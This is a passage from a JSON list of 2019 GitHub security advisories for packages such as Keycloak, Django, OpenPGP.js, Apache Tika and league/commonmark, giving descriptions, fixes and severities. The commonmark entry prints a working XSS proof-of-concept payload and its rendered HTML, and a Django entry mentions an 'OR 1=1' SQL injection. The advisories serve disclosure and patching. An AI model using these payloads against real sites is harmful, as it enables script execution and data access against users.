    "description": "Status Board 1.1.81 has reflected XSS via dashboard.ts.",
    "summary": "Moderate severity vulnerability that affects status-board"
  },
  {
    "ghsaId": "GHSA-p5xp-6vpf-jwvh",
    "publishedAt": "2019-09-23T18:32:27Z",
    "description": "It was found that Keycloak's account console, up to 6.0.1, did not perform adequate header checks in some requests. An attacker could use this flaw to trick an authenticated user into performing operations via request from an untrusted domain.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-4fgq-gq9g-3rw7",
    "publishedAt": "2019-09-23T18:32:16Z",
    "description": "It was found that Keycloak's SAML broker, versions up to 6.0.1, did not verify missing message signatures. If an attacker modifies the SAML Response and removes the <Signature> sections, the message is still accepted, and the message can be modified. An attacker could use this flaw to impersonate other users and gain access to sensitive information.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-vf23-f26f-mjj9",
    "publishedAt": "2019-09-23T18:32:02Z",
    "description": "## Type juggling vulnerability in the API\r\n\r\n### Impact\r\nYOURLS through 1.7.3 is affected by a type juggling vulnerability in the API component that can result in login bypass.\r\n\r\n### Patches\r\nhttps://github.com/YOURLS/YOURLS/releases/tag/1.7.4\r\nhttps://github.com/YOURLS/YOURLS/pull/2542\r\n\r\n### References\r\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14537\r\n* https://github.com/Wocanilo/CVE-2019-14537\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [YOURLS repository](https://github.com/YOURLS/YOURLS)\r\n",
    "summary": "Moderate severity vulnerability that affects yourls/yourls"
  },
  {
    "ghsaId": "GHSA-mc84-xr9p-938r",
    "publishedAt": "2019-09-23T18:31:05Z",
    "description": "## Generated code uses repository configuration that downloads over HTTP instead of HTTPS\n\n### Impact\r\nGradle users were using the http://repo.spring.io/plugins-release repositories in plain HTTP, and not HTTPS, so a man-in-the-middle attack was possible at build time.\r\n\r\n### Patches\r\n\r\nMaven users should at least upgrade to 6.3.0 while Gradle users should update to 6.3.1.\r\nIf you are not able to upgrade make sure not to use a Maven repository via `http` in your build file.\r\n\r\n### Workarounds\r\n\r\nReplace all custom repository definitions in `build.gradle` or `pom.xml` with their `https` version.\r\n\r\ne.g.\r\n\r\n```xml\r\n <repository>\r\n            <id>oss.sonatype.org-snapshot</id>\r\n            <url>https://oss.sonatype.org/content/repositories/snapshots</url> // <-- must be httpS\r\n            <releases>\r\n                <enabled>false</enabled>\r\n            </releases>\r\n            <snapshots>\r\n                <enabled>true</enabled>\r\n            </snapshots>\r\n</repository>\r\n```\r\n\r\n```gradle\r\nmaven { url \"https://repo.spring.io/plugins-release\" } // <-- must be httpS\r\n```\r\n\r\n### References\r\n* https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H\r\n* https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [https://github.com/jhipster/generator-jhipster/issues](https://github.com/jhipster/generator-jhipster/issues)\r\n\n",
    "summary": "High severity vulnerability that affects generator-jhipster"
  },
  {
    "ghsaId": "GHSA-p6mr-pxg4-68hx",
    "publishedAt": "2019-09-17T23:21:34Z",
    "description": "Bower before 1.8.8 has a path traversal vulnerability permitting file write in arbitrary locations via install command, which allows attackers to write arbitrary files when a malicious package is extracted.",
    "summary": "High severity vulnerability that affects bower"
  },
  {
    "ghsaId": "GHSA-3v43-877x-qgmq",
    "publishedAt": "2019-09-17T22:47:47Z",
    "description": "## CVE-2019-10010\r\n\r\n### Impact\r\n\r\nIn `league/commonmark` 0.18.2 and below, malicious users can insert double-encoded HTML entities into their Markdown like this:\r\n\r\n```md\r\n[XSS](javascript&amp;colon;alert%28&#039;XSS&#039;%29)\r\n```\r\n\r\nThis library would (correctly) unescape the `&amp;` entity to `&` during the parsing step.  However, **the renderer step would fail to properly re-escape the resulting `&colon;` string**, thus producing the following malicious HTML output:\r\n\r\n```html\r\n<p><a href=\"javascript&colon;alert('XSS')\">XSS</a></p>\r\n```\r\n\r\nBrowsers would interpret `&colon;` as a `:` character and allow the JS to be executed when the link is clicked.\r\n\r\nThis vulnerability was present in the upstream library this project was forked from and therefore exists in all prior versions of `league/commonmark`.\r\n\r\n### Solution\r\n\r\nThe new [0.18.3](https://github.com/thephpleague/commonmark/releases/tag/0.18.3) release mirrors [the fix made upstream](https://github.com/commonmark/commonmark.js/commit/c89b35c5fc99bdf1d2181f7f0c9fcb8a1abc27c8) - we no longer attempt to preserve entities when rendering HTML attributes like `href`, `src`, `title`, etc.\r\n\r\nThe `$preserveEntities` parameter of `Xml::escape()` is therefore no longer used internally, so it has been deprecated and marked for removal in the next major release (0.19.0).\r\n\r\n### Credits\r\n\r\n - Mohit Fawaz for identifying the issue\r\n - Sebastiaan Knijnenburg and Ross Tuck for responsibly disclosing/relaying the issue\r\n - John MacFarlane for investigating it and implementing the upstream fix we mirrored here\r\n\r\n### References\r\n\r\n - https://nvd.nist.gov/vuln/detail/CVE-2019-10010\r\n - https://github.com/thephpleague/commonmark/releases/tag/0.18.3\r\n - https://github.com/thephpleague/commonmark/issues/353\r\n- https://github.com/FriendsOfPHP/security-advisories/blob/master/league/commonmark/CVE-2019-10010.yaml",
    "summary": "Moderate severity vulnerability that affects league/commonmark"
  },
  {
    "ghsaId": "GHSA-63qc-p2x4-9fgf",
    "publishedAt": "2019-09-17T22:47:11Z",
    "description": "In the Eclipse Paho Java client library version 1.2.0, when connecting to an MQTT server using TLS and setting a host name verifier, the result of that verification is not checked. This could allow one MQTT server to impersonate another and provide the client library with incorrect information.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.paho:org.eclipse.paho.client.mqttv3"
  },
  {
    "ghsaId": "GHSA-549f-73hh-mj38",
    "publishedAt": "2019-09-16T22:24:02Z",
    "description": "NPM package gitlabhook version 0.0.17 is vulnerable to a Command Injection vulnerability. Arbitrary commands can be injected through the repository name.\nNo fix is currently available for this vulnerability, therefore is it recommended to not install or use this module at this time.",
    "summary": "High severity vulnerability that affects gitlabhook"
  },
  {
    "ghsaId": "GHSA-mwp6-j9wf-968c",
    "publishedAt": "2019-09-13T21:33:25Z",
    "description": "Duplicate of GHSA-j3rh-8vwq-wh84\nAccount takeover and privilege escalation is possible in applications generated by generator-jhipster before 6.3.0.  This is due to a vulnerability in the generated java classes: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)\n\nGenerated applications must be manually patched, following instructions in the release notes: https://www.jhipster.tech/2019/09/13/jhipster-release-6.3.0.html",
    "summary": "Critical severity vulnerability that affects generator-jhipster"
  },
  {
    "ghsaId": "GHSA-62gw-3rmj-wmp2",
    "publishedAt": "2019-09-13T13:25:47Z",
    "description": "## Microsoft Security Advisory CVE-2019-1301: Denial of Service Vulnerability in .NET Core\r\n\r\n# Microsoft Security Advisory CVE-2019-1301: Denial of Service Vulnerability in PowerShell Core\r\n## Executive Summary\r\n\r\nA denial of service vulnerability exists when PowerShell Core or .NET Core improperly handles web requests. An attacker who successfully exploited this vulnerability could cause a denial of service against a PowerShell Core scripts.\r\n\r\nThe update addresses the vulnerability by correcting how the .NET Core handles web requests.\r\n\r\nSystem administrators are advised to update PowerShell Core to an unaffected version (see [affected software](#user-content-affected-software).)\r\n\r\n\r\n## Discussion\r\n\r\nPlease [open a support question](https://github.com/PowerShell/PowerShell/issues/new?assignees=&labels=Issue-Question&template=Support_Question.md&title=Support+Question) to discussion the PowerShell aspects of this advisory.\r\nPlease use dotnet/announcements#121 for discussion of the .NET aspects this advisory.\r\n\r\n## <a name=\"affected-software\">Affected Software</a>\r\n\r\nThe vulnerability affects PowerShell Core prior to the following versions:\r\n\r\n| PowerShell Core Version | Fixed in          |\r\n|-------------------------|-------------------|\r\n| 6.1                     | 6.1.6               |\r\n| 6.2                     | 6.2.3               |\r\n| 7.0                     | unaffected               |\r\n\r\n## Advisory FAQ\r\n\r\n### How do I know if I am affected?\r\n\r\nIf all of the following are true:\r\n\r\n1. Run `pwsh -v`, then, check the version in the table in [Affected Software](#user-content-affected-software) to see if your version of PowerShell Core is affected.\r\n1. If you are running a version of PowerShell Core where the executable is not `pwsh` or `pwsh.exe`, then you are affected.  This only existed for preview version of `6.0`.\r\n\r\n### How do I update to an unaffected version?\r\n\r\nFollow the instructions at [Installing PowerShell Core](https://docs.microsoft.com/en-us/powershell/scripting/setup/installing-powershell?view=powershell-6) to install the latest version of PowerShell Core.\r\n\r\n## Other Information\r\n\r\n### Reporting Security Issues\r\n\r\nIf you have found a potential security issue in PowerShell Core,\r\nplease email details to secure@microsoft.com.\r\n\r\n### Support\r\n\r\nYou can ask questions about this issue on GitHub in the PowerShell organization.\r\nThis is located at https://github.com/PowerShell/.\r\nThe Announcements repo (https://github.com/PowerShell/Announcements)\r\nwill contain this bulletin as an issue and will include a link to a discussion issue where you can ask questions.\r\n\r\n### What if the update breaks my script or module?\r\n\r\nYou can uninstall the newer version of PowerShell Core and install the previous version of PowerShell Core.\r\nThis should be treated as a temporary measure.\r\nTherefore, the script or module should be updated to work with the patched version of PowerShell Core.\r\n\r\n### Acknowledgments\r\n\r\nPaul Ryman of VMware Sydney Engineering Team\r\n\r\nMicrosoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure.\r\n\r\nSee [acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments) for more information.\r\n\r\n### External Links\r\n\r\n[CVE-2019-1301](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1301)\r\n\r\n### Revisions\r\n\r\nV1.0 (September 12, 2019): Advisory published.\r\n\r\n*Version 1.0*\r\n*Last Updated 2019-09-12*\r\n\r\n",
    "summary": "High severity vulnerability that affects System.Management.Automation"
  },
  {
    "ghsaId": "GHSA-9mrq-cjgh-32g2",
    "publishedAt": "2019-09-13T13:22:33Z",
    "description": "## rel noopener vulnerability\n\n### Impact\r\nClicking on smartbanner _View_ link and navigating to 3rd party page leaves `window.opener` exposed. It may allow hostile 3rd parties to abuse `window.opener`, e.g. by redirection or injection on the original page with smartbanner.\r\n\r\n### Patches\r\n`rel=\"noopener\"` is automatically populated to links as of `v1.14.1` which is a recommended upgrade to resolve the vulnerability.\r\n\r\n### Workarounds\r\nIf you can not upgrade to `v1.14.1`:\r\n1. Ensure _View_ link is only taking users to App Store or Google Play Store where security is guarded by respective app store security teams\r\n2. If _View_ link is going to a 3rd party page, limit smartbanner.js to be used on iOS that decreases the scope of the vulnerability since as of Safari 12.1,  `rel=\"noopener\"` is imposed on all `target=\"_blank\"` links.\r\n\r\n    Following combination of smartbanner meta tags can be used to achieve the above:\r\n\r\n    ```html\r\n    <meta name=\"smartbanner:enabled-platforms\" content=\"none\">\r\n    <meta name=\"smartbanner:include-user-agent-regex\" content=\"Mobile.*Safari\">\r\n    ```\r\n\r\n### References\r\n* [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/)\r\n* [Safari 12.1 Release Notes](https://developer.apple.com/documentation/safari_release_notes/safari_12_1_release_notes#3130296)\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [smartbanner.js](https://github.com/ain/smartbanner.js/issues/new)\n",
    "summary": "Low severity vulnerability that affects smartbanner.js"
  },
  {
    "ghsaId": "GHSA-gvxv-5fp2-358q",
    "publishedAt": "2019-09-11T23:08:57Z",
    "description": "In all versions prior to version 3.9.6 for eclipse-wtp, all versions prior to version 9.4.4 for eclipse-cdt, and all versions prior to version 3.0.1 for eclipse-groovy, Spotless was resolving dependencies over an insecure channel (http). If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced. In case that any of these artifacts were compromised, any developers using these could be altered. **Note:** In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low.",
    "summary": "Moderate severity vulnerability that affects com.diffplug.spotless:spotless-eclipse-cdt, com.diffplug.spotless:spotless-eclipse-groovy, and com.diffplug.spotless:spotless-eclipse-wtp"
  },
  {
    "ghsaId": "GHSA-2xwv-3cc9-fp7c",
    "publishedAt": "2019-09-11T23:07:57Z",
    "description": "Seneca < 3.9.0 contains a vulnerability that could lead to exposing environment variables to unauthorized users.",
    "summary": "Low severity vulnerability that affects seneca"
  },
  {
    "ghsaId": "GHSA-fcjw-8rhj-gwwc",
    "publishedAt": "2019-09-11T23:06:57Z",
    "description": "An issue was discovered in Plataformatec Devise before 4.7.1. It confirms accounts upon receiving a request with a blank confirmation_token, if a database record has a blank value in the confirmation_token column. (However, there is no scenario within Devise itself in which such database records would exist.)",
    "summary": "High severity vulnerability that affects devise"
  },
  {
    "ghsaId": "GHSA-2p82-v77v-mppr",
    "publishedAt": "2019-09-11T23:05:57Z",
    "description": "The Airbrake Ruby notifier 4.2.3 for Airbrake mishandles the blacklist_keys configuration option and consequently may disclose passwords to unauthorized actors. This is fixed in 4.2.4 (also, 4.2.2 and earlier are unaffected).",
    "summary": "High severity vulnerability that affects airbrake-ruby"
  },
  {
    "ghsaId": "GHSA-g5m7-57ph-j6p8",
    "publishedAt": "2019-09-11T23:04:57Z",
    "description": "The Nexus Yum Repository Plugin in v2 is vulnerable to Remote Code Execution when instances using CommandLineExecutor.java are supplied vulnerable data, such as the Yum Configuration Capability.",
    "summary": "High severity vulnerability that affects org.sonatype.nexus.plugins:nexus-yum-repository-plugin"
  },
  {
    "ghsaId": "GHSA-xf27-jqwv-gf3r",
    "publishedAt": "2019-09-11T23:03:57Z",
    "description": "An unintended require vulnerability in <v0.5.5 larvitbase-api may allow an attacker to load arbitrary non-production code (JavaScript file).",
    "summary": "High severity vulnerability that affects larvitbase-api"
  },
  {
    "ghsaId": "GHSA-pg2f-r7pc-6fxx",
    "publishedAt": "2019-09-11T22:57:57Z",
    "description": "Multiple CSRF issues exist in MicroPyramid Django CRM 0.2.1 via /change-password-by-admin/, /api/settings/add/, /cases/create/, /change-password-by-admin/, /comment/add/, /documents/1/view/, /documents/create/, /opportunities/create/, and /login/.",
    "summary": "High severity vulnerability that affects django-crm"
  },
  {
    "ghsaId": "GHSA-gjh4-fcv3-whpq",
    "publishedAt": "2019-09-04T10:02:50Z",
    "description": "WebTorrent before 0.107.6 allows XSS in the HTTP server via a title or file name.",
    "summary": "Moderate severity vulnerability that affects webtorrent"
  },
  {
    "ghsaId": "GHSA-2j5x-56p6-hj6x",
    "publishedAt": "2019-09-04T10:02:14Z",
    "description": "A path traversal vulnerability in <= v0.9.7 of statichttpserver npm module allows attackers to list files in arbitrary folders.",
    "summary": "Moderate severity vulnerability that affects statichttpserver"
  },
  {
    "ghsaId": "GHSA-8j4w-5fw4-rm27",
    "publishedAt": "2019-08-27T17:45:33Z",
    "description": "deeply is vulnerable to Prototype Pollution in versions before 3.1.0. The function assign-deep could be tricked into adding or modifying properties of Object.prototype using using a _proto_ payload.",
    "summary": "High severity vulnerability that affects deeply"
  },
  {
    "ghsaId": "GHSA-xjjg-vmw6-c2p9",
    "publishedAt": "2019-08-27T17:44:33Z",
    "description": "All versions of the HTTPie package prior to version 1.0.3 are vulnerable to Open Redirect that allows an attacker to write an arbitrary file with supplied filename and content to the current directory, by redirecting a request from HTTP to a crafted URL pointing to a server in his or hers control.",
    "summary": "High severity vulnerability that affects httpie"
  },
  {
    "ghsaId": "GHSA-4g88-fppr-53pp",
    "publishedAt": "2019-08-27T17:43:33Z",
    "description": "set-value is vulnerable to Prototype Pollution in versions before 2.0.1 and version 3.0.0. The function mixin-deep could be tricked into adding or modifying properties of Object.prototype using any of the constructor, prototype and _proto_ payloads.",
    "summary": "High severity vulnerability that affects set-value"
  },
  {
    "ghsaId": "GHSA-fhjf-83wg-r2j9",
    "publishedAt": "2019-08-27T17:42:33Z",
    "description": "mixin-deep is vulnerable to Prototype Pollution in versions before 1.3.2 and version 2.0.0. The function mixin-deep could be tricked into adding or modifying properties of Object.prototype using a constructor payload.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-4q98-wr72-h35w",
    "publishedAt": "2019-08-27T17:41:33Z",
    "description": "In version 2.0.3 Apache Santuario XML Security for Java, a caching mechanism was introduced to speed up creating new XML documents using a static pool of DocumentBuilders. However, if some untrusted code can register a malicious implementation with the thread context class loader first, then this implementation might be cached and re-used by Apache Santuario - XML Security for Java, leading to potential security flaws when validating signed documents, etc. The vulnerability affects Apache Santuario - XML Security for Java 2.0.x releases from 2.0.3 and all 2.1.x releases before 2.1.4.",
    "summary": "Improper input validation in Apache Santuario XML Security for Java"
  },
  {
    "ghsaId": "GHSA-f5f4-m7qp-w6gc",
    "publishedAt": "2019-08-27T17:40:33Z",
    "description": "Jooby before 1.6.4 has XSS via the default error handler.",
    "summary": "Moderate severity vulnerability that affects io.jooby:jooby"
  },
  {
    "ghsaId": "GHSA-vx6v-2rg6-865h",
    "publishedAt": "2019-08-27T17:39:33Z",
    "description": "django-js-reverse (aka Django JS Reverse) before 0.9.1 has XSS via js_reverse_inline.",
    "summary": "Moderate severity vulnerability that affects django-js-reverse"
  },
  {
    "ghsaId": "GHSA-8cpw-73f2-w58m",
    "publishedAt": "2019-08-27T17:38:33Z",
    "description": "selectize-plugin-a11y before 1.1.0 has XSS via the msg field.",
    "summary": "Moderate severity vulnerability that affects selectize-plugin-a11y"
  },
  {
    "ghsaId": "GHSA-5qfv-rr79-chx5",
    "publishedAt": "2019-08-27T17:37:33Z",
    "description": "Ignite Realtime Openfire before 4.4.1 has reflected XSS via an LDAP setup test.",
    "summary": "Low severity vulnerability that affects org.igniterealtime.openfire:xmppserver"
  },
  {
    "ghsaId": "GHSA-jp6r-xcjj-5h7r",
    "publishedAt": "2019-08-27T17:36:32Z",
    "description": "CyberChef before 8.31.2 allows XSS in core/operations/TextEncodingBruteForce.mjs.",
    "summary": "Moderate severity vulnerability that affects cyberchef"
  },
  {
    "ghsaId": "GHSA-3gx7-xhv7-5mx3",
    "publishedAt": "2019-08-26T16:59:56Z",
    "description": "## 'getStaticValue' function can execute arbitrary code\r\n\r\n### Impact\r\n\r\n`getStaticValue` function can execute arbitrary code.\r\n\r\n### Patches\r\n\r\nThis problem has been patched in 1.4.1. Please update `eslint-utils`.\r\n\r\n### Workarounds\r\n\r\nDon't use `getStaticValue` function, `getStringIfConstant` function, and `getPropertyName` function.\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [eslint-utils](https://github.com/mysticatea/eslint-utils)\r\n\r\n",
    "summary": "Critical severity vulnerability that affects eslint-utils"
  },
  {
    "ghsaId": "GHSA-xqh8-5j36-4556",
    "publishedAt": "2019-08-26T16:59:45Z",
    "description": "## Low: Unlikely SQL injection through schemaName or tableName\r\n\r\n### Impact\r\nAn unlikely SQL injection if the case of an unsanitized table name input.\r\n\r\n### Patches\r\nThe user should upgrade to `6.0.1`. Due to its low impact a backport has not been made to the `5.x` branch.\r\n\r\n### Workarounds\r\nIf there is no likelihood that the `tableName` or `schemaName` options sent to the constructor could be of an unsanitized nature, then no workaround is needed. Else the input could be sanitized and escaped before sending it in. Take note though that such an escaping would need to be removed when upgrading to `6.0.1` or later, to avoid double escaping.\r\n\r\n### References\r\n* [Security issue disclosure](https://github.com/voxpelli/node-connect-pg-simple/issues/151)\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [voxpelli/node-connect-pg-simple](https://github.com/voxpelli/node-connect-pg-simple)\r\n* Email maintainer at [pelle@kodfabrik.se](mailto:pelle@kodfabrik.se)\r\n\r\n",
    "summary": "Low severity vulnerability that affects connect-pg-simple"
  },
  {
    "ghsaId": "GHSA-mr7p-25v2-35wr",
    "publishedAt": "2019-08-23T21:53:51Z",
    "description": "NLTK Downloader before 3.4.5 is vulnerable to a directory traversal, allowing attackers to write arbitrary files via a ../ (dot dot slash) in an NLTK package (ZIP archive) that is mishandled during extraction.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-77jf-fjjf-xcww",
    "publishedAt": "2019-08-23T21:42:22Z",
    "description": "A cryptographic issue in OpenPGP.js <=4.2.0 allows an attacker who is able provide forged messages and gain feedback about whether decryption of these messages succeeded to conduct an invalid curve attack in order to gain the victim's ECDH private key.",
    "summary": "Moderate severity vulnerability that affects openpgp"
  },
  {
    "ghsaId": "GHSA-qwqc-28w3-fww6",
    "publishedAt": "2019-08-23T21:42:20Z",
    "description": "Improper Verification of a Cryptographic Signature in OpenPGP.js <=4.1.2 allows an attacker to forge signed messages by replacing its signatures with a \"standalone\" or \"timestamp\" signature.",
    "summary": "High severity vulnerability that affects openpgp"
  },
  {
    "ghsaId": "GHSA-hfmf-q43v-2ffj",
    "publishedAt": "2019-08-23T21:42:18Z",
    "description": "Improper Verification of a Cryptographic Signature in OpenPGP.js <=4.1.2 allows an attacker to pass off unsigned data as signed.",
    "summary": "High severity vulnerability that affects openpgp"
  },
  {
    "ghsaId": "GHSA-5q54-8p9j-x74j",
    "publishedAt": "2019-08-23T00:05:03Z",
    "description": "pandao Editor.md 1.5.0 allows XSS via the Javas&#99;ript: string.",
    "summary": "Moderate severity vulnerability that affects editor.md"
  },
  {
    "ghsaId": "GHSA-x65c-4fgj-5fc3",
    "publishedAt": "2019-08-23T00:05:00Z",
    "description": "pandao Editor.md 1.5.0 allows XSS via an attribute of an ABBR or SUP element.",
    "summary": "Moderate severity vulnerability that affects editor.md"
  },
  {
    "ghsaId": "GHSA-cwqq-w8c3-r2jw",
    "publishedAt": "2019-08-23T00:04:56Z",
    "description": "MetadataExtractor 2.1.0 allows stack consumption.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-3j5x-7ccf-ppgm",
    "publishedAt": "2019-08-21T16:15:33Z",
    "description": "Recommender before 1.3.1 allows XSS.",
    "summary": "Moderate severity vulnerability that affects recommender-xblock"
  },
  {
    "ghsaId": "GHSA-gq9m-qvpx-68hc",
    "publishedAt": "2019-08-21T16:15:24Z",
    "description": "Pallets Werkzeug before 0.15.3, when used with Docker, has insufficient debugger PIN randomness because Docker containers share the same machine id.",
    "summary": "High severity vulnerability that affects werkzeug"
  },
  {
    "ghsaId": "GHSA-66rh-8fw6-59q6",
    "publishedAt": "2019-08-21T16:15:13Z",
    "description": "assign-deep is vulnerable to Prototype Pollution in versions before 0.4.8 and version 1.0.0. The function assign-deep could be tricked into adding or modifying properties of Object.prototype using either a constructor or a _proto_ payload.",
    "summary": "High severity vulnerability that affects assign-deep"
  },
  {
    "ghsaId": "GHSA-4p8f-mmfj-r45g",
    "publishedAt": "2019-08-21T16:15:04Z",
    "description": "Fat Free CRM before 0.18.1 has XSS in the tags_helper in app/helpers/tags_helper.rb.",
    "summary": "Moderate severity vulnerability that affects fat_free_crm"
  },
  {
    "ghsaId": "GHSA-333g-rpr4-7hxq",
    "publishedAt": "2019-08-20T14:29:03Z",
    "description": "The rest-client gem 1.6.10 through 1.6.13 for Ruby, as distributed on RubyGems.org, included a code-execution backdoor inserted by a third party.\nUsers of an affected version should consider downgrading to the last non-affected version of 1.6.9, or upgrading to 1.7.x.\nAdditionally, a set of other minor gems have been partially or completely yanked and are included in this advisory.\nThese include cron_parser, coin_base, blockchain_wallet, awesome-bot, doge-coin, capistrano-colors, bitcoin_vanity, lita_coin, coming-soon, and omniauth_amazon.",
    "summary": "Critical severity vulnerability that affects awesome-bot, bitcoin_vanity, blockchain_wallet, capistrano-colors, coin_base, coming-soon, cron_parser, doge-coin, lita_coin, omniauth_amazon, and rest-client"
  },
  {
    "ghsaId": "GHSA-8rf6-w2mx-4xjh",
    "publishedAt": "2019-08-19T23:45:47Z",
    "description": "** DISPUTED ** core.py in Mitogen before 0.2.8 has a typo that drops the unidirectional-routing protection mechanism in the case of a child that is initiated by another child. The Ansible extension is unaffected. NOTE: the vendor disputes this issue because it is exploitable only in conjunction with hypothetical other factors, i.e., an affected use case within a library caller, and a bug in the message receiver policy code that led to reliance on this extra protection mechanism.",
    "summary": "Critical severity vulnerability that affects mitogen"
  },
  {
    "ghsaId": "GHSA-cr5j-953j-xw5p",
    "publishedAt": "2019-08-19T19:27:23Z",
    "description": "A command injection vulnerability in Nokogiri v1.10.3 and earlier allows commands to be executed in a subprocess via Ruby's `Kernel.open` method. Processes are vulnerable only if the undocumented method `Nokogiri::CSS::Tokenizer#load_file` is being called with unsafe user input as the filename. This vulnerability appears in code generated by the Rexical gem versions v1.0.6 and earlier. Rexical is used by Nokogiri to generate lexical scanner code for parsing CSS queries. The underlying vulnerability was addressed in Rexical v1.0.7 and Nokogiri upgraded to this version of Rexical in Nokogiri v1.10.4.",
    "summary": "Arbitrary execution of code in Nokogiri"
  },
  {
    "ghsaId": "GHSA-xc6x-cq47-9chw",
    "publishedAt": "2019-08-16T14:03:35Z",
    "description": "An elevation of privilege vulnerability exists in Azure Active Directory Authentication Library On-Behalf-Of flow, in the way the library caches tokens, aka 'Azure Active Directory Authentication Library Elevation of Privilege Vulnerability'.",
    "summary": "Moderate severity vulnerability that affects microsoft.identitymodel.clients.activedirectory"
  },
  {
    "ghsaId": "GHSA-65rm-h285-5cc5",
    "publishedAt": "2019-08-16T14:02:35Z",
    "description": "In words.protocols.jabber.xmlstream in Twisted through 19.2.1, XMPP support did not verify certificates when used with TLS, allowing an attacker to MITM connections.",
    "summary": "High severity vulnerability that affects twisted"
  },
  {
    "ghsaId": "GHSA-fpqp-v323-44xv",
    "publishedAt": "2019-08-16T14:01:35Z",
    "description": "Policy import functionality in Apache Ranger 0.7.0 to 1.2.0 is vulnerable to a cross-site scripting issue. Upgrade to 2.0.0 or later version of Apache Ranger with the fix.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-6r97-cj55-9hrq",
    "publishedAt": "2019-08-16T14:00:34Z",
    "description": "An issue was discovered in Django 1.11.x before 1.11.23, 2.1.x before 2.1.11, and 2.2.x before 2.2.4. Due to an error in shallow key transformation, key and index lookups for django.contrib.postgres.fields.JSONField, and key lookups for django.contrib.postgres.fields.HStoreField, were subject to SQL injection. This could, for example, be exploited via crafted use of \"OR 1=1\" in a key or index name to return all records, using a suitably crafted dictionary, with dictionary expansion, as the **kwargs passed to the QuerySet.filter() function.",
    "summary": "Critical severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-fp5j-3fpf-mhj5",
    "publishedAt": "2019-08-08T15:18:22Z",
    "description": "Prior to Spark 2.3.3, in certain situations Spark would write user data to local disk unencrypted, even if spark.io.encryption.enabled=true. This includes cached blocks that are fetched to disk (controlled by spark.maxRemoteBlockSizeFetchToMem); in SparkR, using parallelize; in Pyspark, using broadcast and parallelize; and use of python udfs.",
    "summary": "Sensitive data written to disk unencrypted in Spark"
  },
  {
    "ghsaId": "GHSA-mfwh-gqx8-c787",
    "publishedAt": "2019-08-06T01:43:40Z",
    "description": "A carefully crafted or corrupt zip file can cause an OOM in Apache Tika's RecursiveParserWrapper in versions 1.7-1.21. Users should upgrade to 1.22 or later.",
    "summary": "High severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-4mq5-mj59-qq9c",
    "publishedAt": "2019-08-06T01:43:38Z",
    "description": "In Apache Tika 1.19 to 1.21, a carefully crafted 2003ml or 2006ml file could consume all available SAXParsers in the pool and lead to very long hangs. Apache Tika users should upgrade to 1.22 or later.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-parsers"
  },
  {
    "ghsaId": "GHSA-mm7m-xg4h-6m52",
    "publishedAt": "2019-08-06T01:43:35Z",
    "description": "A carefully crafted package/compressed file that, when unzipped/uncompressed yields the same file (a quine), causes a StackOverflowError in Apache Tika's RecursiveParserWrapper in versions 1.7-1.21. Apache Tika users should upgrade to 1.22 or later.",
    "summary": "High severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-h5jv-4p7w-64jg",
    "publishedAt": "2019-08-06T01:43:33Z",
    "description": "An issue was discovered in Django 1.11.x before 1.11.23, 2.1.x before 2.1.11, and 2.2.x before 2.2.4. Due to the behaviour of the underlying HTMLParser, django.utils.html.strip_tags would be extremely slow to evaluate certain inputs containing large sequences of nested incomplete HTML entities.",
    "summary": "High severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-v9qg-3j8p-r63v",
    "publishedAt": "2019-08-06T01:43:31Z",
    "description": "An issue was discovered in Django 1.11.x before 1.11.23, 2.1.x before 2.1.11, and 2.2.x before 2.2.4. If passed certain inputs, django.utils.encoding.uri_to_iri could lead to significant memory usage due to a recursion when repercent-encoding invalid UTF-8 octet sequences.",
    "summary": "High severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-c4qh-4vgv-qc6g",
    "publishedAt": "2019-08-06T01:43:29Z",
    "description": "An issue was discovered in Django 1.11.x before 1.11.23, 2.1.x before 2.1.11, and 2.2.x before 2.2.4. If django.utils.text.Truncator's chars() and words() methods were passed the html=True argument, they were extremely slow to evaluate certain inputs due to a catastrophic backtracking vulnerability in a regular expression. The chars() and words() methods are used to implement the truncatechars_html and truncatewords_html template filters, which were thus vulnerable.",
    "summary": "High severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-w69w-jvc7-wjgv",
    "publishedAt": "2019-08-01T19:18:16Z",
    "description": "undertow before version 2.0.23.Final is vulnerable to an information leak issue. Web apps may have their directory structures predicted through requests without trailing slashes via the api.",
    "summary": "High severity vulnerability that affects io.undertow:undertow-core"
  },
  {
    "ghsaId": "GHSA-gwp4-hfv6-p7hw",
    "publishedAt": "2019-08-01T19:18:06Z",
